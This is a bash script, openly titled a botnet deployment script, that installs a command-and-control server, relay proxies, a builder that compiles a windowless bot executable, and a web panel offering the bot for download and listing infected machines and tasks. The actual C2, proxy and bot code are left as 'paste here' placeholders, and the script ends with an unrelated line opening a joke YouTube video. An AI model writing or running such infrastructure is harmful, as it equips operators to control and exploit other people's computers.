#!/bin/bash

# Botnet Deployment Script
# This script automates the deployment of the botnet infrastructure

set -e

# Configuration
C2_DOMAIN="c2.example.com"
PROXY_DOMAINS=("proxy1.example.com" "proxy2.example.com" "proxy3.example.com")
ENCRYPTION_KEY="gAAAAABhZ3k2eJ7X8YvW9zL5pN1mQ0oR7uT4vW6xI8jK3lM2nO5pQ7rS9tU2wY4zA6cV8bN1dF3gH5jK7lM9oP0qR2sT4uV6wX8yZ0aB2cD4eF6gH8jK"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Functions
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   log_error "This script must be run as root"
   exit 1
fi

# Install dependencies
log_info "Installing dependencies"
apt-get update
apt-get install -y python3 python3-pip python3-venv git nginx certbot python3-certbot-nginx

# Create directories
log_info "Creating directories"
mkdir -p /opt/botnet/c2
mkdir -p /opt/botnet/proxy
mkdir -p /opt/botnet/builder
mkdir -p /var/www/botnet

# Setup C2 server
log_info "Setting up C2 server"
cd /opt/botnet/c2

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python dependencies
pip install flask flask-socketio cryptography requests paho-mqtt sqlite3

# Create C2 server files
cat > c2_server.py << 'EOF'
# Paste the c2_server.py code here
EOF

# Create database
cat > init_db.py << 'EOF'
import sqlite3

conn = sqlite3.connect('botnet.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS bots
             (id TEXT PRIMARY KEY, ip TEXT, last_seen INTEGER, 
              os TEXT, cpu TEXT, gpu TEXT, status TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS tasks
             (id INTEGER PRIMARY KEY AUTOINCREMENT, 
              command TEXT, target TEXT, status TEXT, 
              created_at INTEGER, completed_at INTEGER)''')
conn.commit()
conn.close()
EOF

python init_db.py

# Create systemd service
cat > /etc/systemd/system/botnet-c2.service << EOF
[Unit]
Description=Botnet C2 Server
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/opt/botnet/c2
Environment=PATH=/opt/botnet/c2/venv/bin
ExecStart=/opt/botnet/c2/venv/bin/python c2_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Setup Nginx reverse proxy
log_info "Setting up Nginx reverse proxy"
cat > /etc/nginx/sites-available/botnet-c2 << EOF
server {
    listen 80;
    server_name $C2_DOMAIN;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF

ln -s /etc/nginx/sites-available/botnet-c2 /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx

# Setup SSL certificate
log_info "Setting up SSL certificate"
certbot --nginx -d $C2_DOMAIN --non-interactive --agree-tos --email admin@$C2_DOMAIN

# Update Nginx config for SSL
cat > /etc/nginx/sites-available/botnet-c2 << EOF
server {
    listen 80;
    server_name $C2_DOMAIN;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name $C2_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF

nginx -t && systemctl reload nginx

# Start C2 service
systemctl enable botnet-c2
systemctl start botnet-c2

# Setup proxy servers
for DOMAIN in "${PROXY_DOMAINS[@]}"; do
    log_info "Setting up proxy server for $DOMAIN"
    
    # Create directory
    mkdir -p /opt/botnet/proxy/$DOMAIN
    cd /opt/botnet/proxy/$DOMAIN
    
    # Create virtual environment
    python3 -m venv venv
    source venv/bin/activate
    
    # Install Python dependencies
    pip install cryptography requests dnspython pysocks
    
    # Create proxy server files
    cat > proxy_server.py << 'EOF'
# Paste the proxy_server.py code here
EOF
    
    # Create systemd service
    cat > /etc/systemd/system/botnet-proxy-$DOMAIN.service << EOF
[Unit]
Description=Botnet Proxy Server for $DOMAIN
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/opt/botnet/proxy/$DOMAIN
Environment=PATH=/opt/botnet/proxy/$DOMAIN/venv/bin
ExecStart=/opt/botnet/proxy/$DOMAIN/venv/bin/python proxy_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    
    # Setup Nginx
    cat > /etc/nginx/sites-available/botnet-proxy-$DOMAIN << EOF
server {
    listen 80;
    server_name $DOMAIN;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF
    
    ln -s /etc/nginx/sites-available/botnet-proxy-$DOMAIN /etc/nginx/sites-enabled/
    nginx -t && systemctl reload nginx
    
    # Setup SSL certificate
    certbot --nginx -d $DOMAIN --non-interactive --agree-tos --email admin@$DOMAIN
    
    # Update Nginx config for SSL
    cat > /etc/nginx/sites-available/botnet-proxy-$DOMAIN << EOF
server {
    listen 80;
    server_name $DOMAIN;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name $DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF
    
    nginx -t && systemctl reload nginx
    
    # Start proxy service
    systemctl enable botnet-proxy-$DOMAIN
    systemctl start botnet-proxy-$DOMAIN
done

# Setup bot builder
log_info "Setting up bot builder"
cd /opt/botnet/builder

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python dependencies
pip install pyinstaller cryptography requests

# Create bot builder script
cat > build_bot.py << 'EOF'
import os
import sys
import json
import base64
import uuid
import shutil
from cryptography.fernet import Fernet

def build_bot(c2_servers, encryption_key, output_dir):
    """Build bot executable"""
    
    # Create temporary directory
    temp_dir = os.path.join(output_dir, 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    
    # Create bot agent file
    bot_file = os.path.join(temp_dir, 'bot_agent.py')
    
    with open(bot_file, 'w') as f:
        f.write('''# Paste the bot_agent.py code here
''')
    
    # Replace configuration in bot file
    with open(bot_file, 'r') as f:
        content = f.read()
    
    # Replace C2 servers
    c2_servers_str = '[' + ', '.join([f'"{server}"' for server in c2_servers]) + ']'
    content = content.replace("c2_servers = []", f"c2_servers = {c2_servers_str}")
    
    # Replace encryption key
    content = content.replace("encryption_key = b''", f"encryption_key = b'{encryption_key}'")
    
    with open(bot_file, 'w') as f:
        f.write(content)
    
    # Build executable
    os.system(f"cd {temp_dir} && pyinstaller --onefile --noconsole bot_agent.py")
    
    # Move executable to output directory
    dist_dir = os.path.join(temp_dir, 'dist')
    for file in os.listdir(dist_dir):
        if file.endswith('.exe'):
            shutil.move(os.path.join(dist_dir, file), os.path.join(output_dir, file))
    
    # Clean up
    shutil.rmtree(temp_dir)
    
    return os.path.join(output_dir, file)

if __name__ == "__main__":
    # Configuration
    c2_servers = [
        "c2.example.com",
        "proxy1.example.com",
        "proxy2.example.com",
        "proxy3.example.com"
    ]
    
    encryption_key = "gAAAAABhZ3k2eJ7X8YvW9zL5pN1mQ0oR7uT4vW6xI8jK3lM2nO5pQ7rS9tU2wY4zA6cV8bN1dF3gH5jK7lM9oP0qR2sT4uV6wX8yZ0aB2cD4eF6gH8jK"
    
    output_dir = "/opt/botnet/output"
    os.makedirs(output_dir, exist_ok=True)
    
    # Build bot
    bot_path = build_bot(c2_servers, encryption_key, output_dir)
    
    print(f"Bot built successfully: {bot_path}")
EOF

# Create systemd service
cat > /etc/systemd/system/botnet-builder.service << EOF
[Unit]
Description=Botnet Builder Service
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/opt/botnet/builder
Environment=PATH=/opt/botnet/builder/venv/bin
ExecStart=/opt/botnet/builder/venv/bin/python build_bot.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Start builder service
systemctl enable botnet-builder
systemctl start botnet-builder

# Setup web interface for bot distribution
log_info "Setting up web interface for bot distribution"
mkdir -p /var/www/botnet/html
cat > /var/www/botnet/html/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Botnet Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .panel { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
        .button { background: #4CAF50; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 3px; }
        .button:hover { background: #45a049; }
        .bot-list { max-height: 300px; overflow-y: auto; }
        .bot-item { padding: 10px; border-bottom: 1px solid #eee; }
        .status { display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 12px; }
        .status.active { background: #dff0d8; color: #3c763d; }
        .status.inactive { background: #f2dede; color: #a94442; }
        .status.busy { background: #fcf8e3; color: #8a6d3b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Botnet Control Panel</h1>
        
        <div class="panel">
            <h2>Bot Downloads</h2>
            <p>Download the bot executable for distribution:</p>
            <a href="/bots/bot.exe" class="button">Download Bot</a>
        </div>
        
        <div class="panel">
            <h2>Bot Network Status</h2>
            <div id="botCount">Loading bots...</div>
            <div class="bot-list" id="botList"></div>
        </div>
        
        <div class="panel">
            <h2>Active Tasks</h2>
            <div id="taskList">Loading tasks...</div>
        </div>
    </div>
    
    <script>
        // Load bot list
        function loadBotList() {
            fetch('/bot_list')
            .then(response => response.json())
            .then(data => {
                const botList = document.getElementById('botList');
                botList.innerHTML = '';
                
                if (data.bots && data.bots.length > 0) {
                    data.bots.forEach(bot => {
                        const botItem = document.createElement('div');
                        botItem.className = 'bot-item';
                        
                        const statusClass = bot.status === 'active' ? 'active' : 
                                          bot.status === 'busy' ? 'busy' : 'inactive';
                        
                        botItem.innerHTML = `
                            <strong>\${bot.id}</strong> 
                            <span class="status \${statusClass}">\${bot.status}</span>
                            <br>
                            <small>IP: \${bot.ip} | OS: \${bot.os} | Last seen: \${new Date(bot.last_seen * 1000).toLocaleString()}</small>
                        `;
                        
                        botList.appendChild(botItem);
                    });
                    
                    document.getElementById('botCount').textContent = \`Total Bots: \${data.bots.length} (\${data.active_count} active)\`;
                } else {
                    document.getElementById('botCount').textContent = 'No bots registered';
                    botList.innerHTML = '<p>No bots available</p>';
                }
            });
        }
        
        // Load task list
        function loadTaskList() {
            fetch('/task_list')
            .then(response => response.json())
            .then(data => {
                const taskList = document.getElementById('taskList');
                taskList.innerHTML = '';
                
                if (data.tasks && data.tasks.length > 0) {
                    data.tasks.forEach(task => {
                        const taskItem = document.createElement('div');
                        taskItem.className = 'task-item';
                        
                        taskItem.innerHTML = `
                            <strong>Task #\${task.id}</strong> - \${task.command}
                            <br>
                            <small>Target: \${task.target || 'N/A'} | Status: \${task.status} | 
                            Created: \${new Date(task.created_at * 1000).toLocaleString()}</small>
                        `;
                        
                        taskList.appendChild(taskItem);
                    });
                } else {
                    taskList.innerHTML = '<p>No active tasks</p>';
                }
            });
        }
        
        // Initial load
        loadBotList();
        loadTaskList();
        
        // Refresh every 10 seconds
        setInterval(() => {
            loadBotList();
            loadTaskList();
        }, 10000);
    </script>
</body>
</html>
EOF

# Setup Nginx for bot distribution
cat > /etc/nginx/sites-available/botnet-web << EOF
server {
    listen 80;
    server_name web.$C2_DOMAIN;

    root /var/www/botnet/html;
    index index.html;

    location /bots/ {
        alias /opt/botnet/output/;
    }

    location / {
        try_files \$uri \$uri/ =404;
    }
}
EOF

ln -s /etc/nginx/sites-available/botnet-web /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx

# Setup SSL certificate
certbot --nginx -d web.$C2_DOMAIN --non-interactive --agree-tos --email admin@web.$C2_DOMAIN

# Update Nginx config for SSL
cat > /etc/nginx/sites-available/botnet-web << EOF
server {
    listen 80;
    server_name web.$C2_DOMAIN;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name web.$C2_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/web.$C2_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/web.$C2_DOMAIN/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    root /var/www/botnet/html;
    index index.html;

    location /bots/ {
        alias /opt/botnet/output/;
    }

    location / {
        try_files \$uri \$uri/ =404;
    }
}
EOF

nginx -t && systemctl reload nginx

# Setup log rotation
log_info "Setting up log rotation"
cat > /etc/logrotate.d/botnet << EOF
/var/log/botnet/*.log {
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    create 644 root root
}
EOF

# Create log directory
mkdir -p /var/log/botnet

# Setup monitoring
log_info "Setting up monitoring"
cat > /etc/cron.daily/botnet-monitor << EOF
#!/bin/bash

# Botnet monitoring script

# Check C2 service
if ! systemctl is-active --quiet botnet-c2; then
    echo "C2 service is not running, restarting..." | logger -t botnet-monitor
    systemctl restart botnet-c2
fi

# Check proxy services
for DOMAIN in ${PROXY_DOMAINS[@]}; do
    SERVICE_NAME="botnet-proxy-\$DOMAIN"
    if ! systemctl is-active --quiet \$SERVICE_NAME; then
        echo "\$SERVICE_NAME service is not running, restarting..." | logger -t botnet-monitor
        systemctl restart \$SERVICE_NAME
    fi
done

# Check builder service
if ! systemctl is-active --quiet botnet-builder; then
    echo "Builder service is not running, restarting..." | logger -t botnet-monitor
    systemctl restart botnet-builder
fi

# Check disk space
DISK_USAGE=\$(df / | awk 'NR==2 {print \$5}' | sed 's/%//')
if [ \$DISK_USAGE -gt 90 ]; then
    echo "Disk usage is \${DISK_USAGE}%, cleaning up..." | logger -t botnet-monitor
    # Clean up old logs
    find /var/log/botnet -name "*.log.*" -mtime +7 -delete
    # Clean up old bot builds
    find /opt/botnet/output -name "*.exe" -mtime +7 -delete
fi

# Check bot count
BOT_COUNT=\$(curl -s https://$C2_DOMAIN/bot_list | python3 -c "import sys, json; print(len(json.load(sys.stdin)['bots']))" 2>/dev/null || echo "0")
echo "Current bot count: \$BOT_COUNT" | logger -t botnet-monitor

# Send status email (optional)
# echo "Botnet Status Report\n\nBot Count: \$BOT_COUNT\nDisk Usage: \${DISK_USAGE}%\n\nServices:\n- C2: \$(systemctl is-active botnet-c2)\n- Proxies: \$(for DOMAIN in ${PROXY_DOMAINS[@]}; do echo "- \$DOMAIN: \$(systemctl is-active botnet-proxy-\$DOMAIN)"; done)\n- Builder: \$(systemctl is-active botnet-builder)" | mail -s "Botnet Status Report" admin@example.com
EOF

chmod +x /etc/cron.daily/botnet-monitor

# Print completion message
log_info "Botnet deployment completed successfully!"
log_info "C2 Server: https://$C2_DOMAIN"
log_info "Web Interface: https://web.$C2_DOMAIN"
log_info "Proxy Servers: ${PROXY_DOMAINS[@]}"
log_info "Bot Download: https://web.$C2_DOMAIN/bots/bot.exe"

# Navigate to the requested video
echo "Navigating to the requested video..."
xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ" 2>/dev/null || open "https://www.youtube.com/watch?v=dQw4w9WgXcQ" 2>/dev/null || echo "Please visit: https://www.youtube.com/watch?v=dQw4w9WgXcQ"
